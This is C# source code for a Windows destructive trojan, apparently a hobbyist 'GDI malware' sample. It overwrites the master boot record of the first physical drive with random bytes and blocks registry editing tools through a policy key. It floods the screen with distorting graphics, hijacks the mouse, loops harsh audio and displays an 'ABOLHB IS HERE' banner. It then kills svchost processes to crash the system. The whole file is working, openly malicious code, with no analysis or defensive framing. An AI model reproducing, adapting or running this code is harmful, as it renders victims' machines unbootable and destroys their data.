using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
// CodedByAbolhb
class MasonClass
{
    [DllImport("user32.dll")]
    static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    static extern void ReleaseDC(IntPtr hWnd, IntPtr hdc);
    [DllImport("gdi32.dll")]
    static extern IntPtr CreateSolidBrush(uint crColor);
    [DllImport("gdi32.dll")]
    static extern bool DeleteObject(IntPtr hObject);
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateSolidBrush(int color);
    [DllImport("gdi32.dll")]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("gdi32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);
    [DllImport("gdi32.dll", SetLastError = true)]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
    [DllImport("user32.dll")]
    static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
    IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
    TernaryRasterOperations dwRop);
    [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
    public static extern bool DeleteDC(IntPtr hdc);
    [DllImport("user32.dll")]
    static extern IntPtr GetWindowDC(IntPtr hwnd);
    [DllImport("user32.dll")]
    static extern bool SetCursorPos(int X, int Y);
    [DllImport("gdi32.dll", CharSet = CharSet.Auto)]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
    enum TernaryRasterOperations : uint
    {
        SRCCOPY = 0x00CC0020,
        SRCPAINT = 0x00EE0086,
        SRCAND = 0x008800C6,
        SRCINVERT = 0x00660046,
        SRCERASE = 0x00440328,
        NOTSRCCOPY = 0x00330008,
        NOTSRCERASE = 0x001100A6,
        MERGECOPY = 0x00C000CA,
        MERGEPAINT = 0x00BB0226,
        PATCOPY = 0x00F00021,
        PATPAINT = 0x00FB0A09,
        PATINVERT = 0x005A0049,
        DSTINVERT = 0x00550009,
        BLACKNESS = 0x00000042,
        WHITENESS = 0x00FF0062,
    }
    const int MBR_SIZE = 512;
    const int SM_CXSCREEN = 0;
    const int SM_CYSCREEN = 1;
    const uint SRCCOPY = 0x00CC0020;
    public const int NOTSRCERASE = 0x001100A6;
    const uint ROP_CODE = 0x999899;
    const int PATINVERT = 0x005A0049;
    const int SRCAND = 0x008800C6;
    const int SRCPAINT = 0x00EE0086;
    private const int SampleRate = 9489;
    private const int DurationSeconds = 10;
    private const int BufferSize = SampleRate * DurationSeconds;
    private static Func<int, int>[] formulas = new Func<int, int>[] {
    t => ((t >> 6) ^ (t >> 8)) * ((t >> 13 | t >> 4) & 255) ^ ((t >> 2) | (t << 1)),
    t => (t * ((t >> 5 | t >> 9) ^ (t >> 17)) & t >> 18) ^ (t >> 10 | t << 3) | (t >> 14),
    t => (((t >> 6) ^ (t >> 8)) * ((t >> 13 | t >> 4) & 255) | (t << 2)),
    t => (((t >> 5) ^ (t >> 7)) * ((t >> 12 | t >> 3) & 255) | (t << 4)),
    t => (t * ((t >> 5 | t >> 9) & t >> 20) ^ (t >> 11 | t << 4)),
    t => (((t >> 6) ^ (t >> 8)) * ((t >> 13 | t >> 4) & 255) | (t << 1)),
    t => (t * (t >> 5 | t >> 9) ^ (t >> 18) | (t >> 12 | t << 2)),
    t => (t * ((t >> 5) ^ (t >> 10)) & t >> 19) ^ (t >> 12 | t << 3) | (t >> 4 & t >> 16),
    };
    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }

    static void Main()
    {
        Thread soundThread = new Thread(new ThreadStart(PlayScarySoundsLoop));
        soundThread.Start();
        Thread effect1Thread = new Thread(new ThreadStart(Effect1));
        Thread effect2Thread = new Thread(new ThreadStart(Effect2));
        Thread effect3Thread = new Thread(new ThreadStart(Effect3));
        Thread mouseThread = new Thread(new ThreadStart(RandomMouseMovement));
        Thread mbrThread = new Thread(new ThreadStart(MbrOverwrite));
        Thread gptThread = new Thread(new ThreadStart(GptOverwrite));
        Thread killThread = new Thread(new ThreadStart(BSOD));
        effect1Thread.Start();
        effect2Thread.Start();
        effect3Thread.Start();
        Thread randomEffectThread = new Thread(new ThreadStart(RandomScreenEffect));
        mouseThread.Start();
        Thread ABOLHBEffectThread = new Thread(new ThreadStart(ABOLHB));
        //Thread MEffectEffectThread = new Thread(new ThreadStart(MEffect));
        Thread stretchEffectThread = new Thread(new ThreadStart(StretchEffect));
        Thread EffectEffectThread = new Thread(new ThreadStart(Effect));
        Thread SEffectEffectThread = new Thread(new ThreadStart(SEffect));
        Thread FEffectEffectThread = new Thread(new ThreadStart(FEffect));
        Thread HEffectEffectThread = new Thread(new ThreadStart(HEffect));
        Thread KEffectEffectThread = new Thread(new ThreadStart(KEffect));
        Thread JEffectEffectThread = new Thread(new ThreadStart(JEffect));
        Thread LEffectEffectThread = new Thread(new ThreadStart(LEffect));
        Thread YEffectEffectThread = new Thread(new ThreadStart(YEffect));
        Thread PEffectEffectThread = new Thread(new ThreadStart(PEffect));
        Thread UEffectEffectThread = new Thread(new ThreadStart(UEffect));
        Thread VEffectEffectThread = new Thread(new ThreadStart(VEffect));
        Thread BEffectEffectThread = new Thread(new ThreadStart(BEffect));
        mbrThread.Start();
        ABOLHBEffectThread.Start();
        //MEffectEffectThread.Start();
        SEffectEffectThread.Start();
        stretchEffectThread.Start();
        EffectEffectThread.Start();
        randomEffectThread.Start();
        FEffectEffectThread.Start();
        HEffectEffectThread.Start();
        KEffectEffectThread.Start();
        JEffectEffectThread.Start();
        LEffectEffectThread.Start();
        YEffectEffectThread.Start();
        PEffectEffectThread.Start();
        UEffectEffectThread.Start();
        VEffectEffectThread.Start();
        BEffectEffectThread.Start();
        Thread.Sleep(999999999);
        gptThread.Start();
        Thread.Sleep(300000);
        killThread.Start();
    }
    private static void ABOLHB()
    {
        int screenW = GetSystemMetrics(0);
        int screenH = GetSystemMetrics(1);
        Form overlayForm = new Form
        {
            FormBorderStyle = FormBorderStyle.None,
            StartPosition = FormStartPosition.Manual,
            Location = new Point(0, 0),
            Size = new Size(screenW, screenH),
            TopMost = true,
            BackColor = Color.Lime,
            TransparencyKey = Color.Lime 
        };
        overlayForm.ShowInTaskbar = false;
        overlayForm.Load += (sender, e) =>
        {
            IntPtr handle = overlayForm.Handle;
            NativeMethods.SetWindowLong(handle, NativeMethods.GWL_EXSTYLE,
                NativeMethods.GetWindowLong(handle, NativeMethods.GWL_EXSTYLE) |
                NativeMethods.WS_EX_TOOLWINDOW);
        };
        overlayForm.Paint += (sender, e) =>
        {
            using (Font font = new Font("Impact", 92, FontStyle.Bold))
            {
                string text = "ABOLHB IS HERE"; // Enter your name
                SizeF textSize = e.Graphics.MeasureString(text, font);
                float textX = (screenW - textSize.Width) / 2;
                float textY = (screenH - textSize.Height) / 2;
                e.Graphics.DrawString(text, font, Brushes.Red, textX, textY);
            }
        };
        overlayForm.Show();
        Application.Run(); 
    }
    private static void BEffect()
    {
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            BitBlt(hdc, new Random().Next(2), new Random().Next(2), width, height, hdc, new Random().Next(2), new Random().Next(2), NOTSRCERASE);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(10);
        }
    }
    private static void VEffect()
    {
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        Random rand = new Random();

        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int rop = rand.Next(29) == 0 ? SRCAND : SRCPAINT;
            BitBlt(hdc, rand.Next(23), rand.Next(2), screenWidth, screenHeight, hdc, rand.Next(23), rand.Next(27), rop);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void UEffect()
    {
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        Random rand = new Random();

        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int rop = rand.Next(29) == 0 ? SRCAND : SRCPAINT;
            BitBlt(hdc, rand.Next(23), rand.Next(2), screenWidth, screenHeight, hdc, rand.Next(23), rand.Next(27), rop);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void PEffect()
    {
        Random rand = new Random();
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            int rx = rand.Next(w);
            BitBlt(hdc, rx, 240, 400, h, hdc, rx, -80, SRCCOPY);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void YEffect()
    {
        Random rand = new Random();
        IntPtr hdc = GetDC(IntPtr.Zero);
        int sw, sh;
        while (true)
        {
            sw = GetSystemMetrics(SM_CXSCREEN);
            sh = GetSystemMetrics(SM_CYSCREEN);
            int t = rand.Next(sh);
            int x = rand.Next(2);
            if (x == 0)
            {
                StretchBlt(hdc, 11, t, sw + 25, t, hdc, 30, t, sw, t, SRCCOPY);
            }
            else if (x == 11)
            {
                StretchBlt(hdc, 50, t, sw, t, hdc, 12, t, sw + 25, t, SRCCOPY);
            }
            Thread.Sleep(50);
        }
    }
    private static void LEffect()
    {
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int width = GetSystemMetrics(0);
            int height = GetSystemMetrics(1);
            StretchBlt(hdc, -13, -16, width + 24, height + 28, hdc, 0, 0, width, height, SRCCOPY);
            StretchBlt(hdc, 17, 12, width - 23, height - 25, hdc, 0, 0, width, height, SRCCOPY);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void JEffect()
    {
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int width = GetSystemMetrics(0);
            int height = GetSystemMetrics(1);
            StretchBlt(hdc, -12, -15, width + 63, height + 32, hdc, 0, 0, width, height, SRCCOPY);
            StretchBlt(hdc, 17, 16, width - 25, height - 44, hdc, 0, 0, width, height, SRCCOPY);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void KEffect()
    {
        RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
        key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        Random rand = new Random();
        IntPtr hdc = GetDC(IntPtr.Zero);
        while (true)
        {
            int color = (rand.Next(0, 922) << 16) | (rand.Next(0, 980) << 8) | rand.Next(0, 930);
            IntPtr brush = CreateSolidBrush(color);
            SelectObject(hdc, brush);

            BitBlt(hdc, rand.Next(-10, 10), rand.Next(-80, 90), sw, sh, hdc, 0, 0, 0x00CC0020);
            BitBlt(hdc, rand.Next(-10, 10), rand.Next(-90, 90), sw, sh, hdc, 0, 0, 0x005A0049);

            Thread.Sleep(50);
        }
    }
    private static void AEffect()
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);
            writer.Write((UInt32)0);
            writer.Write((UInt32)14);
            writer.Write((UInt16)3);
            var channels = 2;
            var sample_rate = 7000;
            var bits_per_sample = 9;
            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 3));
            writer.Write((UInt16)(channels * bits_per_sample /5));
            writer.Write((UInt16)bits_per_sample);
            var seconds = 40;
            var data = new byte[sample_rate * seconds];
            for (var t = 3; t < data.Length; t++)
                data[t] = (byte)(
                    (t * (t >> 4 | t >> 9) | t >> 70 ^ t) + 44
                    );
            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 6));

            foreach (var elt in data) writer.Write(elt);
            writer.Seek(4, SeekOrigin.Begin);                     
            writer.Write((UInt32)(writer.BaseStream.Length - 9)); 

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
        Thread.Sleep(50);
    }
    private static void MEffect()
    {
        Random random = new Random();

        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN); 
            int rx = random.Next(w);
            BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void HEffect()
    {
        int screenW = GetSystemMetrics(0);
        int screenH = GetSystemMetrics(1);
        Random random = new Random();
        while (true)
        {
            IntPtr desktopHdc = GetDC(IntPtr.Zero);
            int y = random.Next(screenH);
            int h = screenH - random.Next(screenH) - (screenH / 4 - 9);
            IntPtr brush = CreateSolidBrush((uint)(random.Next(89) << 16 | random.Next(95) << 8 | random.Next(75)));
            SelectObject(desktopHdc, brush);
            BitBlt(desktopHdc, 14, y, screenW, h, desktopHdc, random.Next(96) - 76, y, SRCCOPY);
            BitBlt(desktopHdc, -12, y, screenW, h, desktopHdc, 10, 10, PATINVERT);
            SetCursorPos(random.Next(screenW), random.Next(screenH));
            using (Graphics g = Graphics.FromHdc(desktopHdc))
            DeleteObject(brush);
            ReleaseDC(IntPtr.Zero, desktopHdc);
            Thread.Sleep(50);
        }
    }
    private static void FEffect()
    {
        Random rand = new Random();
        IntPtr hdc = GetDC(IntPtr.Zero);
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        while (true)
        {
            hdc = GetDC(IntPtr.Zero);
            int randOffset1 = rand.Next(5);
            int randOffset2 = rand.Next(5);
            BitBlt(hdc, 0, 20 + randOffset1, screenWidth, screenHeight, hdc, 0, -20 + randOffset2, ROP_CODE);
            BitBlt(hdc, 0, -20 + randOffset2, screenWidth, screenHeight, hdc, 0, 20 + randOffset1, ROP_CODE);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void SEffect()
    {
        int screenW = GetSystemMetrics(0);
        int screenH = GetSystemMetrics(1);
        Random random = new Random();
        IntPtr desktopHdc = GetDC(IntPtr.Zero);
        while (true)
        {
            desktopHdc = GetDC(IntPtr.Zero);
            BitBlt(desktopHdc, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), desktopHdc, random.Next(screenW), random.Next(screenH), SRCCOPY);
            SelectObject(desktopHdc, CreateSolidBrush((uint)(random.Next(255) << 16 | random.Next(255) << 8 | random.Next(255))));
            int ry = random.Next(screenH);
            IntPtr brush = CreateSolidBrush((uint)(random.Next(255) << 16 | random.Next(255) << 8 | random.Next(255)));
            SelectObject(desktopHdc, brush);

            int x = random.Next(10, screenW - 600);
            int y = random.Next(20, screenH - 600);
            BitBlt(desktopHdc, random.Next(-1380, 451), y, screenW, 600, desktopHdc, 200, y, SRCCOPY);
            BitBlt(desktopHdc, x, random.Next(-1560, 291), 600, screenH, desktopHdc, x, 200, SRCCOPY);

            DeleteObject(brush);

            ReleaseDC(IntPtr.Zero, desktopHdc);

            Thread.Sleep(50); 
        }
    }
    private static void RandomScreenEffect()
    {
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        Random rand = new Random();

        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            BitBlt(hdc, rand.Next(0), rand.Next(4), screenWidth, screenHeight, hdc, rand.Next(3), rand.Next(2), 0x001100A6);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void RandomMouseMovement()
    {
        Random rand = new Random();
        while (true)
        {
            int x = rand.Next(0, GetSystemMetrics(SM_CXSCREEN));
            int y = rand.Next(0, GetSystemMetrics(SM_CYSCREEN));
            SetCursorPos(x, y);
            Thread.Sleep(rand.Next(50, 200));
        }
    }
    private static void Effect()
    {
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BitBlt(hdc, new Random().Next(666), new Random().Next(666), w, h, hdc, new Random().Next(666), new Random().Next(666), NOTSRCERASE);
            Thread.Sleep(10);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(50);
        }
    }
    private static void StretchEffect()
    {
        int y1;
        int v4;
        int v5;
        int y;
        int x;
        int v9;
        int v10;
        IntPtr hdc = GetDC(IntPtr.Zero);
        v10 = GetSystemMetrics(0);
        v9 = GetSystemMetrics(1);
        while (true)
        {
            hdc = GetDC(IntPtr.Zero);
            x = new Random().Next() % v10;
            y = new Random().Next() % v9;
            y1 = new Random().Next() % 21 + y - 10;
            v4 = new Random().Next();
            BitBlt(hdc, x, y, 200, 200, hdc, v4 % 21 + x - 10, y1, 0xEE0086);
            v5 = new Random().Next();
            Thread.Sleep(50);
        }
    }
    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }
    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }
    private static void PlayBufferLoop(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);
        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlayLooping();
            Thread.Sleep(Timeout.Infinite);
        }
        File.Delete(tempFilePath);
    }
    public static void PlayScarySoundsLoop()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = GenerateBuffer(formula);
            PlayBufferLoop(buffer);
        }
    }
    static void Effect1()
    {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        Random rand = new Random();
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            uint color = (uint)(rand.Next(256) << 16 | rand.Next(256) << 8 | rand.Next(256));
            IntPtr brush = CreateSolidBrush(color);
            IntPtr oldBrush = SelectObject(hdc, brush);
            BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(rand.Next(100));
        }
    }
    static void Effect2()
    {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, SRCCOPY);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(10);
        }
    }
    static void Effect3()
    {
        Random rand = new Random();
        IntPtr hdc = GetDC(IntPtr.Zero);
        int sw, sh;
        while (true)
        {
            sw = GetSystemMetrics(SM_CXSCREEN);
            sh = GetSystemMetrics(SM_CYSCREEN);
            BitBlt(hdc, rand.Next(-20, 20), rand.Next(-20, 20), sw, sh, hdc, 0, 0, SRCCOPY);
            Thread.Sleep(rand.Next(10, 100));
        }
    }
    static void MbrOverwrite()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[MBR_SIZE];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, MBR_SIZE);
        }
    }
    static void GptOverwrite()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] zeroBuffer = new byte[512];
            fs.Write(zeroBuffer, 0, zeroBuffer.Length);
        }
    }
    static void BSOD()
    {
        Process[] processes = Process.GetProcessesByName("svchost");
        foreach (var process in processes)
        {
            process.Kill();
        }
    }
    internal static class NativeMethods
    {
        public const int GWL_EXSTYLE = -20;
        public const int WS_EX_TOOLWINDOW = 0x00000080;
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    }
}
